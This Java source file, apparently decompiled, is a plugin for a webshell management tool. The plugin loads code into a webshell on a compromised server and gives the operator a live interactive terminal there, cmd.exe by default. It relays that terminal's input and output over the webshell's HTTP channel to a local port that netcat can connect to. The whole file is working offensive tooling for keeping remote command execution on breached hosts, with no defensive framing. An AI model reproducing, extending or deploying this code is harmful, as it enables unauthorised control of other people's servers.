package shells.plugins.generic;

import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;


public abstract class RealCmd
  implements Plugin
{
  private JPanel panel;
  private RTextArea tipTextArea;
  private JButton StartButton;
  private JButton StopButton;
  private JLabel hostLabel;
  private JLabel portLabel;
  private JLabel pollingSleepLabel;
  private JLabel execFileLabel;
  private JTextField hostTextField;
  private JTextField portTextField;
  private JTextField execFileTextField;
  
  public RealCmd() {
    this.panel = new JPanel(new BorderLayout());
    this.pollingSleepLabel = new JLabel("polling Sleep(ms)");
    this.execFileLabel = new JLabel("exec file");
    this.hostLabel = new JLabel("BindHost :");
    this.portLabel = new JLabel("BindPort :");
    this.StartButton = new JButton("Start");
    this.StopButton = new JButton("Stop");
    this.tipTextArea = new RTextArea();
    this.pollingSleepTextField = new JTextField("1000", 7);
    this.execFileTextField = new JTextField("cmd.exe", 30);
    this.hostTextField = new JTextField("127.0.0.1", 15);
    this.portTextField = new JTextField("4444", 7);
    this.realSplitPane = new JSplitPane();

    
    this.tipTextArea.setText(new String(functions.readInputStreamAutoClose(RealCmd.class.getResourceAsStream("assets/realCmd.txt"))));

    
    this.clients = new ArrayList<>();

    
    this.realSplitPane.setOrientation(0);
    this.realSplitPane.setDividerSize(0);
    
    JPanel realTopPanel = new JPanel();
    realTopPanel.add(this.pollingSleepLabel);
    realTopPanel.add(this.pollingSleepTextField);
    realTopPanel.add(this.execFileLabel);
    realTopPanel.add(this.execFileTextField);
    realTopPanel.add(this.hostLabel);
    realTopPanel.add(this.hostTextField);
    realTopPanel.add(this.portLabel);
    realTopPanel.add(this.portTextField);
    realTopPanel.add(this.StartButton);
    realTopPanel.add(this.StopButton);
    
    this.realSplitPane.setTopComponent(realTopPanel);
    this.realSplitPane.setBottomComponent(new JScrollPane((Component)this.tipTextArea));

    
    this.sleepTime = new Integer(this.pollingSleepTextField.getText());
    
    this.panel.add(this.realSplitPane);
  }
  private JTextField pollingSleepTextField; private JSplitPane realSplitPane; private boolean loadState; private ShellEntity shellEntity; private Payload payload; private Encoding encoding; private ArrayList<Socket> clients; private boolean isRuning; private ByteArrayOutputStream bufferByteArrayOutputStream; private Integer sleepTime; private ServerSocket serverSocket;
  public synchronized void StartButtonClick(ActionEvent actionEvent) {
    load();
    if (!this.isRuning) {
      int port = Integer.parseInt(this.portTextField.getText());
      String host = this.hostTextField.getText();
      
      InetSocketAddress socketAddress = startRealCmd(port, host, this.execFileTextField.getText(), Integer.valueOf(Integer.parseInt(this.pollingSleepTextField.getText())));
      if (socketAddress != null) {
        String tipStr = String.format("已开启终端请使用netcat连接host:%s,port:%s", new Object[] { socketAddress.getHostName(), Integer.valueOf(socketAddress.getPort()) });
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), tipStr, "提示", 1);
        Log.log(tipStr, new Object[0]);
      } else {
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "已有终端在运行 无法再次开启", "提示", 2);
      } 
    } else {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "已有终端在运行 无法再次开启", "提示", 2);
    } 
  }
  
  public InetSocketAddress startRealCmd(int port, String host, final String cmd, final Integer sleepTime) {
    load();
    if (!this.isRuning) {
      try {
        this.isRuning = true;
        this.serverSocket = new ServerSocket(port, 1, InetAddress.getByName(host));
        (new Thread(new Runnable()
            {
              public void run() {
                Socket client = null;
                try {
                  client = RealCmd.this.serverSocket.accept();
                  RealCmd.this.clients.add(client);
                  RealCmd.this.serverSocket.close();
                  RealCmd.RunCmd runCmd = new RealCmd.RunCmd(client, sleepTime, RealCmd.this.payload);
                  runCmd.starAndWait(cmd, RealCmd.this.isTryStart());
                  RealCmd.this.clients.remove(client);
                  RealCmd.this.StopButtonClick(null);
                } catch (Exception e) {
                  Log.error(e);
                } finally {
                  RealCmd.this.isRuning = false;
                  if (client != null && !client.isClosed()) {
                    try {
                      client.close();
                    } catch (IOException e) {
                      Log.error(e);
                    } 
                  }
                } 
              }
            })).start();
        return new InetSocketAddress(this.serverSocket.getInetAddress(), this.serverSocket.getLocalPort());
      } catch (Exception e) {
        this.isRuning = false;
        Log.error(e);
        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), e.getMessage());
      } 
    } else {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "已有终端在运行 无法再次开启", "提示", 2);
    } 
    return null;
  }
  
  public void StopButtonClick(ActionEvent actionEvent) {
    load();
    
    try {
      if (this.serverSocket != null && !this.serverSocket.isClosed()) {
        this.serverSocket.close();
      }
    } catch (Exception e) {
      Log.error(e);
    } 
    
    ReqParameter reqParameter = new ReqParameter();
    reqParameter.add("action", "stop");
    byte[] result = this.payload.evalFunc(getClassName(), "realCmd", reqParameter);
    if (Arrays.equals("ok".getBytes(), result)) {
      GOptionPane.showMessageDialog(getView(), "stop ok", "提示", 1);
    } else if (result != null) {
      GOptionPane.showMessageDialog(getView(), this.encoding.Decoding(result), "提示", 2);
    } else {
      GOptionPane.showMessageDialog(getView(), "fail", "提示", 2);
    } 
    this.isRuning = false;
  }
  private void load() {
    if (!this.loadState) {
      try {
        if (this.payload.include(getClassName(), readPlugin())) {
          this.loadState = true;
          Log.log("Load success", new Object[0]);
        } else {
          Log.log("Load fail", new Object[0]);
        } 
      } catch (Exception e) {
        Log.error(e);
      } 
    }
  }

  
  public boolean isTryStart() {
    return false;
  }

  
  public void init(ShellEntity shellEntity) {
    this.shellEntity = shellEntity;
    this.payload = this.shellEntity.getPayloadModule();
    this.encoding = Encoding.getEncoding(this.shellEntity);
    automaticBindClick.bindJButtonClick(RealCmd.class, this, RealCmd.class, this);
  }
  
  public void closePlugin() {
    this.clients.stream().forEach(socket -> {
          if (!socket.isClosed()) {
            try {
              if (!socket.isClosed()) {
                socket.close();
              }
              StopButtonClick(null);
            } catch (IOException e) {
              Log.error(e);
            } 
          }
        });
  }


  
  public JPanel getView() {
    return this.panel;
  }
  
  public abstract byte[] readPlugin();
  
  public abstract String getClassName();
  
  class RunCmd { Payload payload;
    int errNum;
    Lock lock = new ReentrantLock(); OutputStream outputStream;
    InputStream inputStream;
    Integer sleepTime;
    boolean alive;
    Thread ioThread;
    Thread oiThread;
    Socket socket;
    
    public RunCmd(Socket socket, Integer sleepTime, Payload payload) {
      try {
        this.alive = true;
        this.socket = socket;
        this.inputStream = socket.getInputStream();
        this.outputStream = socket.getOutputStream();
        this.payload = payload;
        this.sleepTime = sleepTime;
        this.oiThread = new Thread(() -> {
              try {
                startOI();
              } catch (Exception e) {
                try {
                  if (!socket.isClosed()) {
                    socket.close();
                  }
                } catch (IOException ioException) {
                  ioException.printStackTrace();
                } 
                Log.error(e);
              } finally {
                this.alive = false;
              } 
            });
        this.ioThread = new Thread(() -> {
              try {
                startIO();
              } catch (Exception e) {
                try {
                  if (!socket.isClosed()) {
                    socket.close();
                  }
                } catch (IOException ioException) {
                  ioException.printStackTrace();
                } 
                Log.error(e);
              } finally {
                this.alive = false;
              } 
            });
      } catch (Exception e) {
        Log.error(e);
      } 
    }
    
    public void starAndWait(String commandStr, boolean isTryStrat) throws Exception {
      ReqParameter parameter = new ReqParameter();
      parameter.add("action", "start");
      parameter.add("cmdLine", RealCmd.this.encoding.Encoding(commandStr));
      
      String[] commandArgs = functions.SplitArgs(commandStr);
      for (int i = 0; i < commandArgs.length; i++) {
        parameter.add(String.format("arg-%d", new Object[] { Integer.valueOf(i) }), RealCmd.this.encoding.Encoding(commandArgs[i]));
      } 
      parameter.add("argsCount", String.valueOf(commandArgs.length));
      
      String[] executableArgs = functions.SplitArgs(commandStr, 1, false);
      
      if (executableArgs.length > 0) {
        parameter.add("executableFile", executableArgs[0]);
        if (executableArgs.length >= 2) {
          parameter.add("executableArgs", executableArgs[1]);
        }
      } 
      if (!isTryStrat) {
        byte[] res = this.payload.evalFunc(RealCmd.this.getClassName(), "realCmd", parameter);
        if (res != null) {
          this.outputStream.write(res);
          if (Arrays.equals("ok".getBytes(), res)) {
            this.ioThread.start();
            this.oiThread.start();
            this.oiThread.join();
            closeSocket();
            this.ioThread.join();
            closeSocket();
          } 
        } 
      } else {
        (new Thread(() -> this.payload.evalFunc(RealCmd.this.getClassName(), "realCmd", parameter))).start();
        Thread.sleep(1500L);
        this.ioThread.start();
        this.oiThread.start();
        this.oiThread.join();
        closeSocket();
        this.ioThread.join();
        closeSocket();
      } 
    }
    private void startIO() throws Exception {
      byte[] buffer = new byte[521];
      int readNum = -1;
      while ((readNum = this.inputStream.read(buffer)) != -1 && this.alive) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("action", "processWriteData");
        reqParameter.add("processWriteData", Arrays.copyOf(buffer, readNum));
        byte[] res = sendHandle(reqParameter);
        if (res != null) {
          if (res.length == 0) {
            return;
          }
          if (res[0] == 5) {
            writeToClientStream(Arrays.copyOfRange(res, 1, res.length), false); continue;
          } 
          writeToClientStream(res, true);
          Log.error(String.format("RealCmd processWriteDataErr :%s", new Object[] { new String(res) }));
          return;
        } 
      } 
    }
    
    private void startOI() throws Exception {
      while (this.alive) {
        Thread.sleep(this.sleepTime.longValue());
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("action", "getResult");
        byte[] res = sendHandle(reqParameter);
        if (res != null) {
          if (res.length == 0) {
            return;
          }
          if (res[0] == 5) {
            writeToClientStream(Arrays.copyOfRange(res, 1, res.length), false); continue;
          } 
          writeToClientStream(res, true);
          Log.error(String.format("RealCmd processWriteDataErr :%s", new Object[] { new String(res) }));
          return;
        } 
      } 
    }

    
    public void writeToClientStream(byte[] data, boolean canEncode) throws IOException {
      if (canEncode) {
        this.outputStream.write(RealCmd.this.encoding.Decoding(data).getBytes());
      } else {
        this.outputStream.write(data);
      } 
    }

    
    public byte[] sendHandle(ReqParameter reqParameter) {
      if (this.errNum > 10) {
        return "The number of errors exceeded the limit".getBytes();
      }
      this.lock.lock();
      byte[] ret = null;
      try {
        ret = this.payload.evalFunc(RealCmd.this.getClassName(), "realCmd", reqParameter);
        this.errNum = 0;
      } catch (Exception e) {
        this.errNum++;
        Log.error(e);
      } 
      this.lock.unlock();
      return ret;
    }
    
    public void closeSocket() {
      try {
        if (this.socket != null && !this.socket.isClosed()) {
          this.socket.close();
        }
      } catch (Exception e) {
        Log.error(e);
      } 
    } }

}
